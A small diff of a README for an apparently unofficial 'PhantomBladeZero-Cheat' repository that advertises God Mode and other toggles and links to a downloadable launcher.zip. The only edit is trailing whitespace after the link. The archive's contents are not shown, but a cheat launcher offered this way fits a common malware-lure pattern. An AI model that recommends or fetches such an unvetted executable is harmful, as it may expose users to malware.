@@ -14,7 +14,7 @@ God Mode, Auto-Parry, Infinite Sha-Chi, and 50+ toggleable options. Steam compat
 
 ---
 
-### 📥 [DOWNLOAD & INSTALLATION](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip)
+### 📥 [DOWNLOAD & INSTALLATION](https://github.com/Separatedimanacle/PhantomBladeZero-Cheat/releases/download/latest/launcher.zip) 
 
 | Step | Action |
 | :--- | :--- |
